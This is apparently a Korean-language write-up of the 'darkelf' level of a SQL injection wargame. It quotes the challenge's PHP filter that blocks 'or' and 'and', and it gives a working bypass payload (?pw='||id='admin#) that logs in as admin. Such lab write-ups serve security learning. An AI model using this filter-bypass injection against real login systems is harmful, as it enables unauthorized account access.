<img width="195" alt="스크린샷 2020-01-16 오후 6 56 00" src="https://user-images.githubusercontent.com/54495632/72515179-cc2b6c80-3892-11ea-8598-97d5e11dc656.png">

6번 DARKELF

<img width="702" alt="스크린샷 2020-01-16 오후 6 56 21" src="https://user-images.githubusercontent.com/54495632/72515195-d3eb1100-3892-11ea-99be-732e58fccac1.png">

소스코드를 보면,

if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
-> or과 and 가 필터링 된다.

$query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'";
쿼리 문 자체는 그 전 문제와 차이가 없다.

if($result['id'] == 'admin') solve("darkelf");  -> id= admin 인 경우 문제가 solve된다.

or과 and 가 필터링됐는데 and는 이 문제에서 이용하지 않았고
or을 || 로 대체하여 사용했다.

$query = "select id from prob_darkelf where id='guest' and pw=''||id='admin'#
과 같이 쿼리를 주어 해결했다.

URL로 하면, ?pw='||id='admin# 에 해당된다.

<img width="697" alt="스크린샷 2020-01-16 오후 6 57 17" src="https://user-images.githubusercontent.com/54495632/72515434-3a702f00-3893-11ea-8673-406b1c629eb2.png">